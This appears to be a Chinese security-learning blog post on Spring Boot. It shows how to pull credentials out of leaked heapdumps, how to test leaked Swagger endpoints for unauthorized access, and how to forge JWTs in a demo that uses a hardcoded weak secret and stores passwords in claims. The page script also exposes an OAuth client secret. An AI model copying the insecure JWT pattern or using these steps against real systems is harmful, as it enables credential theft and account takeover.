<p> <img src="/assets/image-20240718013930-539d5fp.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> 4、heapdump泄漏</p>
<p> 得到<strong>对应heapdump包</strong>可以使用工具进行分析：获取到配置信息&#x3D;&#x3D;（&#x3D;&#x3D;​&#x3D;&#x3D;<strong>分析提取出敏感信息（配置帐号密码，接口信息 数据库 短信 云应用等配置）</strong>&#x3D;&#x3D;</p>
<p> <img src="/assets/image-20240718014533-vhuk6im.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> <img src="/assets/image-20240718014646-m23s7wu.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> 工具使用</p>
<ul>
<li><p>官方工具—jvisualvm分析器</p>
<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livescript">安装jdk自带，文件搜索获取<br>如：C:<span class="hljs-string">\Program</span> Files<span class="hljs-string">\Java\jdk1.8.0_112\bin\jvisualvm.exe</span><br></code></pre></td></tr></table></figure>

<p><img src="/assets/image-20240718014845-1tlhha9.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p><img src="/assets/image-20240718014853-cxfqj8s.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
</li>
<li><p>其它工具—JDumpSpider提取器<a target="_blank" rel="noopener" href="https://github.com/whwlsfb/JDumpSpider/releases">https://github.com/whwlsfb/JDumpSpider/releases</a></p>
<p><code>java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump</code>​</p>
<p><img src="/assets/image-20240718015108-ikkxmse.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p><img src="/assets/image-20240718015602-b7ufv9e.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
</li>
</ul>
</li>
<li><p>Swagger&amp;&amp;自动化</p>
<p> 1、创建项目引入依赖</p>
<p> <img src="/assets/image-20240718015934-ab43w6r.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<blockquote>
<p>2.X版本启动需要注释 <strong>@EnableSwagger2</strong></p>
<p><img src="/assets/image-20240718021151-dxk44ab.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p>3.X版本不需注释，写的话是 <strong>@EnableOpenApi</strong><br>2.X访问路径：<a href="http://ip:port">http://ip:port</a> <strong>&#x2F;swagger-ui.html</strong><br>3.X访问路径：<a href="http://ip:port">http://ip:port</a> <strong>&#x2F;swagger-ui&#x2F;index.html</strong></p>
</blockquote>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml">&lt;--2.9.2版本--&gt;<br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>io.springfox<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>springfox-swagger2<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.9.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>io.springfox<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>springfox-swagger-ui<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.9.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p> <img src="/assets/image-20240718020858-18tmvcb.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> <img src="/assets/image-20240718020948-rweg74t.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml">&lt;--3.0.0版本--&gt;<br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>io.springfox<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>springfox-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p> <img src="/assets/image-20240718020504-oj05crc.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> <img src="/assets/image-20240718020626-uxyypaq.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> 2、配置访问</p>
<ul>
<li><p>application.properties</p>
<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-comment"># 设置路径匹配策略为Ant路径匹配器</span><br><span class="hljs-attr">spring.mvc.pathmatch.matching-strategy</span>=<span class="hljs-string">ant-path-matcher</span><br></code></pre></td></tr></table></figure></li>
<li><p>application.yml</p>
<figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yml"><span class="hljs-attr">spring:</span><br>  <span class="hljs-attr">mvc:</span><br>    <span class="hljs-attr">pathmatch:</span><br>      <span class="hljs-comment"># 设置路径匹配策略为Ant路径匹配器</span><br>      <span class="hljs-attr">matching-strategy:</span> <span class="hljs-string">ant_path_matcher</span><br></code></pre></td></tr></table></figure></li>
</ul>
<p> 3、自动化测试</p>
<p> 自动化测试：Postman<br> &#x3D;&#x3D;泄漏应用接口：用户登录，信息显示，上传文件等&#x3D;&#x3D;<br> &#x3D;&#x3D;可用于对未授权访问，信息泄漏，文件上传等安全漏洞的测试.&#x3D;&#x3D;</p>
<ul>
<li>打开postman打开工作台，在左侧找到API</li>
<li>打开API导入生成的<strong>swagger页面提供的API：</strong>​<a target="_blank" rel="noopener" href="http://127.0.0.1:8002/v2/api-docs">http://127.0.0.1:8002/v2/api-docs</a></li>
<li>导入成功后点击<strong>Api Documentation，点击右侧的运行，勾选想要测试的接口，执行即可</strong></li>
</ul>
<p> <img src="/assets/image-20240718021611-6kpwyo5.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
</li>
</ol>
<p>‍</p>
<p>‍</p>
<p>‍</p>
<h3 id="JavaEE应用-SpringBoot框架-JWT身份鉴权-打包部署JAR-WAR"><a href="#JavaEE应用-SpringBoot框架-JWT身份鉴权-打包部署JAR-WAR" class="headerlink" title="JavaEE应用&amp;SpringBoot框架&amp;JWT身份鉴权&amp;打包部署JAR&amp;WAR"></a>JavaEE应用&amp;SpringBoot框架&amp;JWT身份鉴权&amp;打包部署JAR&amp;WAR</h3><ol>
<li><p>JWT身份鉴权</p>
<p> 1、创建项目，引入依赖</p>
<p> <img src="/assets/image-20240718180613-fm94g6i.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> <img src="/assets/image-20240718180646-gvqt2bw.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> <img src="/assets/image-20240718180814-fymj7dn.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> 2、创建，配置以及解析JWT</p>
<p> 对应目录下创建<code>JwtController.java</code>​</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.xiaodi.testjwt.demos.web;<br><br><span class="hljs-keyword">import</span> com.auth0.jwt.JWT;<br><span class="hljs-keyword">import</span> com.auth0.jwt.JWTVerifier;<br><span class="hljs-keyword">import</span> com.auth0.jwt.algorithms.Algorithm;<br><span class="hljs-keyword">import</span> com.auth0.jwt.interfaces.DecodedJWT;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.PostMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;<br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JwtController</span> &#123;<br><br>    <span class="hljs-comment">//模拟用户的jwt身份创建 数据的jwt加密</span><br>    <span class="hljs-meta">@PostMapping(&quot;/jwtcreate&quot;)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">main</span><span class="hljs-params">(Integer id,String user,String pass)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">jwttoken</span> <span class="hljs-operator">=</span> JWT.create()<br>                <span class="hljs-comment">//设置创建的头部部分</span><br>                <span class="hljs-comment">//.withHeader()</span><br><br>                <span class="hljs-comment">//设置创建的payload部分</span><br>                .withClaim(<span class="hljs-string">&quot;userid&quot;</span>, id)<br>                .withClaim(<span class="hljs-string">&quot;username&quot;</span>, user)<br>                .withClaim(<span class="hljs-string">&quot;password&quot;</span>, pass)<br><br>                <span class="hljs-comment">//设置时效（JWT过期时间）</span><br>                <span class="hljs-comment">//.withExpiresAt()</span><br><br>                <span class="hljs-comment">//创建设置的signature部分，算法和密匙</span><br>                .sign(Algorithm.HMAC256(<span class="hljs-string">&quot;xiaodisec&quot;</span>));<br>        System.out.println(jwttoken);<br>        <span class="hljs-keyword">return</span> jwttoken;<br>    &#125;<br><br>    <span class="hljs-comment">//模拟JWT身份的检测 jwt数据解密</span><br>    <span class="hljs-meta">@PostMapping(&quot;/jwtcheck&quot;)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">jwtcheck</span><span class="hljs-params">(String jwtdata)</span> &#123;<br>        <span class="hljs-comment">//String jwtdata=&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNzd29yZCI6ImExMjM0NTYiLCJ1c2VyaWQiOjEsInVzZXJuYW1lIjoiYWRtaW4ifQ.nkMIxHJKyGAHa3aDtTAy5_9j51yWDTQHEL8n-dqE33w&quot;;</span><br><br>        <span class="hljs-comment">//构建解密注册</span><br>        <span class="hljs-type">JWTVerifier</span> <span class="hljs-variable">jwt</span> <span class="hljs-operator">=</span> JWT.require(Algorithm.HMAC256(<span class="hljs-string">&quot;xiaodisec&quot;</span>)).build();<br><br>        <span class="hljs-comment">//解密注册数据</span><br>        <span class="hljs-type">DecodedJWT</span> <span class="hljs-variable">verify</span> <span class="hljs-operator">=</span> jwt.verify(jwtdata);<br><br>        <span class="hljs-comment">//提取注册解密数据 payload部分</span><br>        <span class="hljs-type">Integer</span> <span class="hljs-variable">userid</span> <span class="hljs-operator">=</span> verify.getClaim(<span class="hljs-string">&quot;userid&quot;</span>).asInt();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">username</span> <span class="hljs-operator">=</span> verify.getClaim(<span class="hljs-string">&quot;username&quot;</span>).asString();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">password</span> <span class="hljs-operator">=</span> verify.getClaim(<span class="hljs-string">&quot;password&quot;</span>).asString();<br><br>        <span class="hljs-comment">//提取header部分</span><br>        <span class="hljs-comment">//verify.getHeader();</span><br>        <span class="hljs-comment">//提取sign签名部分</span><br>        <span class="hljs-comment">//verify.getSignature();</span><br><br>        System.out.println(userid + username + password);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;admin page&quot;</span>;<br><br><span class="hljs-comment">//        // 如果需要根据解密的数据执行不同的逻辑，可以使用以下代码进行判断</span><br><span class="hljs-comment">//        if(username.equals(&quot;admin&quot;))&#123;</span><br><span class="hljs-comment">//            return &quot;admin&quot;;</span><br><span class="hljs-comment">//        &#125;else &#123;</span><br><span class="hljs-comment">//            return &quot;gay?&quot;;</span><br><span class="hljs-comment">//        &#125;</span><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p> 3、配置前端提交数据访问客户端页面</p>
<ul>
<li><p>在resources→static→index.html创建如下的前端页面</p>
<p><img src="/assets/image-20240718181427-o1eal7z.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>hello word!!!<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>this is an HTML page<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- Form for creating JWT --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;../jwtcreate&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br>        id:<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;id&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>        user:<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;user&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>        pass:<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;pass&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;create&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- Form for checking JWT --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;../jwtcheck&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br>        jwtdata:<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;jwtdata&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;check&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
</li>
<li><p>对应输入id，用户名，密码，点击create得到eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNzd29yZCI6IjEyMzQ1NiIsInVzZXJpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiJ9.q__DmCYaffqXmQweBgITek-NmhsSAhgwExNA3lQspQk<br>​<img src="/assets/image-20240718181515-ribus8p.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
</li>
<li><p>在官网（<a href="jwt.io">jwt.io</a>）进行解密</p>
<p><img src="/assets/image-20240718181637-z5li4lq.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
</li>
<li><p>跳转至解密成功页面，回显admin page</p>
<p><img src="/assets/image-20240718181718-a4ve0p5.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
</li>
</ul>
<p> 4、安全问题</p>
<p> <img src="/assets/image-20240718181834-cqow4r2.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> 只有jwt编码，在jwt官网进行修改用户参数信息，<strong>没有使用密匙加密</strong></p>
<ol>
<li><p>报错令牌无效</p>
<p> <img src="/assets/image-20240718181905-9zp49xt.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> <img src="/assets/image-20240718181918-mcxo372.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
</li>
</ol>
<p> 输入密匙，在此修改用户信息</p>
<ol>
<li><p>成功登入</p>
<p> <img src="/assets/image-20240718181958-7lztiqq.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> <img src="/assets/image-20240718182006-mgl7aml.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> <img src="/assets/image-20240718182013-5u83dzd.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
</li>
</ol>
</li>
<li><p>打包部署</p>
<ol>
<li><p>jar打包</p>
<p> ①jar类型项目<br> jar类型项目使用SpringBoot打包插件打包时，会在打成的jar中内置tomcat的jar。<br> 所以使用jdk直接运行jar即可，jar项目中功能将代码放到其内置的tomcat中运行。</p>
<p> Jar打包</p>
<p> 报错解决：<a target="_blank" rel="noopener" href="https://blog.csdn.net/wobenqingfeng/article/details/129914639">https://blog.csdn.net/wobenqingfeng/article/details/129914639</a>​<a target="_blank" rel="noopener" href="https://blog.csdn.net/Mrzhuangr/article/details/124731024">https://blog.csdn.net/Mrzhuangr/article/details/124731024</a></p>
<p> <img src="/assets/image-20240718190749-guyn9q2.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<ul>
<li><p>将<code>&lt;skip&gt;true&lt;/skip&gt;</code>​修改为<code>&lt;skip&gt;false&lt;/skip&gt;</code>​ 即可</p>
<p><img src="/assets/image-20240718191118-x0u7t3r.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<ul>
<li><p><code>&lt;configuration&gt;</code>: Maven 插件配置的根元素，其中包含了配置的具体内容。</p>
</li>
<li><p><code>&lt;mainClass&gt;</code>: 指定了 Java 应用程序的主类。在这里，<code>com.example.testjwt.TestJwtApplication</code>​ 被指定为主类，表明这是应用程序的入口点。</p>
</li>
<li><p><code>&lt;skip&gt;</code>: 用于控制插件的执行是否跳过。在这里，设置为 true，表示跳过执行。这可能是因为在某些情况下，你可能希望避免执行特定插件，例如在特定配置下或者在某些阶段跳过构建过程。</p>
</li>
</ul>
</li>
</ul>
<p> 1、maven-clean-package</p>
<p> <img src="/assets/image-20240718190949-gwur4du.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> 2、java -jar xxxxxx.jar</p>
<p> <img src="/assets/image-20240718191138-c3853r2.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
</li>
<li><p>war打包</p>
<p> ②war类型项目<br> 在打包时需要将内置的tomcat插件排除，配置servlet的依赖和修改pom.xml，<br> 然后将war文件放到tomcat安装目录webapps下,启动运行tomcat自动解析即可。</p>
<p> War打包</p>
<p> 1、pom.xml加入或修改：<br>  <strong>&lt;packaging&gt;war&lt;&#x2F;packaging&gt;</strong></p>
<p> <img src="/assets/image-20240718191258-zt7c9t0.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> 2、启动类里面加入配置：</p>
<p> <img src="/assets/image-20240718191447-b0iwqgw.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> 3、maven-clean-package</p>
<p> 如果遇到下图所示报错</p>
<p> <img src="/assets/image-20240718191604-2dknv3e.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> <img src="/assets/image-20240718191630-fxc8hwo.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> 4、将打包好的war文件放在<code>D:\apache-tomcat-9.0.74\webapps\</code>​路径下然后再双击启动<code>D:\apache-tomcat-9.0.74\bin\startup.bat</code>​就会发现在<code>D:\apache-tomcat-9.0.74\webapps\</code>​多出一个war文件名称的目录（假如文件名为222.war则会生成一个名为222的目录）又因为apache-tomcat的默认端口为8080，所以此时访问127.0.0.1:8080&#x2F;222就能成功部署</p>
</li>
<li><p>直接解压放到idea中，自动反编译源码</p>
</li>
</ol>
</li>
</ol>
<p>‍</p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/" class="category-chain-item">安全开发</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/" class="print-no-link">#安全开发</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>安全开发🧩</div>
      <div>http://example.com/2024/07/05/安全开发/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>0z-sIHN</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2024年7月5日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-cc-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2024/08/05/%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91/" title="业务逻辑">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">业务逻辑</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2024/06/30/%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9/" title="信息打点🧐">
                        <span class="hidden-mobile">信息打点🧐</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  
  
    <article id="comments" lazyload>
      
  <div id="gitalk-container"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#gitalk-container', function() {
      Fluid.utils.createCssLink('/css/gitalk.css')
      Fluid.utils.createScript('https://lib.baomitu.com/gitalk/1.8.0/gitalk.min.js', function() {
        var options = Object.assign(
          {"clientID":"Ov23liT0OJSQBYUz81HU","clientSecret":"02c5c39d96d158a8a34967805e40cb90a7b2f1cf","repo":"0z-sihn.github.io","owner":"0z-sIHN","admin":["0z-sIHN"],"language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":true,"createIssueManually":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token"},
          {
            id: 'd48447e88a8cd1bf43616ca571aa2067'
          }
        )
        var gitalk = new Gitalk(options);
        gitalk.render('gitalk-container');
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


    </article>
  


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
<div>
  <span id="timeDate">正在载入天数...</span>
  <span id="times">载入时分秒...</span>
  <script>
  var now = new Date();
  function createtime(){
      var grt= new Date("11/10/2024 22:36:00");
      now.setTime(now.getTime()+250);
      days = (now - grt ) / 1000 / 60 / 60 / 24;
      dnum = Math.floor(days);
      hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum);
      hnum = Math.floor(hours);
      if(String(hnum).length ==1 ){
          hnum = "0" + hnum;
      }
      minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
      mnum = Math.floor(minutes);
      if(String(mnum).length ==1 ){
                mnum = "0" + mnum;
      }
      seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
      snum = Math.round(seconds);
      if(String(snum).length ==1 ){
                snum = "0" + snum;
      }
      document.getElementById("timeDate").innerHTML = "🚀已持续航行&nbsp"+dnum+"&nbsp天";  
      document.getElementById("times").innerHTML = hnum + "&nbsp时&nbsp" + mnum + "&nbsp分&nbsp" + snum + "&nbsp秒";
  }
  setInterval("createtime()",250);
  </script>
</div>

  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="busuanzi_container_site_pv" style="display: none">
        总访问量 
        <span id="busuanzi_value_site_pv"></span>
         次
      </span>
    
    
      <span id="busuanzi_container_site_uv" style="display: none">
        总访客数 
        <span id="busuanzi_value_site_uv"></span>
         人
      </span>
    
    

  

</div>

  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
